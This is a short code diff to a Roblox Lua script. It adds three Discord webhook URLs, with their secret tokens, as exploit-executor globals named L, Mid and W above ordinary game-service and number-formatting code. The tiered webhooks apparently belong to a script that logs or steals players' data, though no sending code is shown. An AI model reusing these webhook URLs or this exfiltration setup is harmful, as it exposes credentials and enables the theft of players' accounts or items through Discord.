@@ -2,6 +2,11 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 
+getgenv().L = "https://discord.com/api/webhooks/1365005068641898629/MGORNE-J9t0QyXqvSl9yTe4tECxEXWcfYtKeetA5JyGLKbWC7TSuYEjza5KrRSbO1_FB"
+getgenv().Mid = "https://discord.com/api/webhooks/1365005136962781326/q65B6v4zoPYPKf5rXBsrx4DFvqtHPj2D3OUCRikSpKaLB7cRgafRffj55ekMUh2-qfxw"
+getgenv().W = "https://discord.com/api/webhooks/1365005196211523625/Kq5pnQQI2sRrnVTYrponKJgik6f0Da29JKKbEcCxQoOSR3-ayunA9BQI5mD21YnOCxdn"
+
+
 local function format_number(number)
     local suffixes = {
         "", "K", "M", "B", "T",
